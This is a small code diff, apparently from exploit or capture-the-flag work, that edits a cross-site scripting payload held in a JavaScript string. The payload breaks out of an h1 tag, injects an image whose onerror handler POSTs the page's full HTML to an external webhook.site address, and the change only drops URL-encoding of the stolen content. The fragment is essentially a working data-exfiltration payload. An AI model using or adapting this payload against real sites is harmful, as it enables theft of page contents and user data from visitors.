@@ -10,7 +10,7 @@
   <script>
       function changeTitle(){
         
-        XSS = '</h1><img src="/" onerror=\"(function(){fetch(\'https://webhook.site/e6ee5b29-cbae-45b0-84f2-f09da517960e\', {method: \'POST\', body: \'contents=\' + encodeURIComponent(document.body.innerHTML), headers: {\'mode\': \'no-cors\'}});})()\"><h1>';
+        XSS = '</h1><img src="/" onerror=\"(function(){fetch(\'https://webhook.site/e6ee5b29-cbae-45b0-84f2-f09da517960e\', {method: \'POST\', body: \'contents=\' + document.body.innerHTML, headers: {\'mode\': \'no-cors\'}});})()\"><h1>';
 
         document.title = XSS;
       }
